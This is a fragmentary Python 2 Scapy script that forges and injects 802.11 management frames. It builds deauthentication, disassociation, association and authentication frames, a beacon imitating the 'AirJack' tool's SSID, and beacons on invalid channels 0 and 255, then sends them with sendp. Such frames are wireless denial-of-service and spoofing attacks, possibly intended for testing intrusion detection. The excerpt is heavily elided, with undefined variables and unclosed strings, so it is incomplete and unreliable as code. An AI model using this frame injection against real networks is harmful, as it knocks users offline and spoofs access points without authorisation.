...
"	station = RandMAC()
	...
	frame = Dot11(addr1=rcvr, addr2=txr, addr3=bssid)/Dot11Deauth(reason=500)
	print frame.show()
...
"	station = RandMAC()
	...
	frame = Dot11(addr1=rcvr, addr2=txr, addr3=bssid)/Dot11Disas(reason=500)
	print frame.show()
	sendp(frame, iface = interface)
...
"	station = RandMAC()
	...
	frame = Dot11(addr1=rcvr, addr2=txr, addr3=bssid)/Dot11Disas(reason=9)
...
"	station = RandMAC()
	...
	frame = Dot11(addr1=rcvr, addr2=txr, addr3=bssid)/Dot11AssoReq()
...
"	station = RandMAC()
	...
	frame = Dot11(addr1=rcvr, addr2=txr, addr3=bssid)/Dot11Auth()
...
"	station = RandMAC()
	...
	frame = Dot11(addr1=rcvr, addr2=txr, addr3=bssid)/Dot11Deauth(reason=9)
...
def longSSID(interface):
	dot11_frame = Dot11(addr1=rcvr,addr2=txr,addr3=bssid)
...
def airJack(interface):
	dot11_frame = Dot11(addr1=rcvr,addr2=txr,addr3=bssid)
	pkt = (Dot11(addr1=rcvr,addr2=txr,addr3=bssid)/Dot11Beacon(cap="ESS")/Dot11Elt(ID="SSID",info="AirJack")/Dot11Elt(ID="Rates",info='\x82\x84\x0b\x16')/Dot11Elt(ID="DSset",info="\x03")/Dot11Elt(ID="TIM",info="\x00\x01\x00\x00"))
	print pkt.show()
	sendp(pkt, iface = interface, loop=0)
...
def invalidChannellBeacon(interface):
	#Channel 0
	dot11_frame = Dot11(addr1=rcvr,addr2=txr,addr3=bssid)
	pkt = (Dot11(addr1=rcvr,addr2=txr,addr3=bssid)/Dot11Beacon(cap="ESS")/Dot11Elt(ID="SSID",info="test")/Dot11Elt(ID="Rates",info='\x82\x84\x0b\x16')/Dot11Elt(ID="DSset",info="\x00")/Dot11Elt(ID="TIM",info="\x00\x01\x00\x00"))
	print pkt.show()
	sendp(pkt, iface = interface, loop=0)	

	#Channel 255
	dot11_frame = Dot11(addr1=rcvr,addr2=txr,addr3=bssid)
	pkt = (Dot11(addr1=rcvr,addr2=txr,addr3=bssid)/Dot11Beacon(cap="ESS")/Dot11Elt(ID="SSID",info="test")/Dot11Elt(ID="Rates",info='\x82\x84\x0b\x16')/Dot11Elt(ID="DSset",info="\xff")/Dot11Elt(ID="TIM",info="\x00\x01\x00\x00"))
	print pkt.show()
	sendp(pkt, iface = interface, loop=0)		
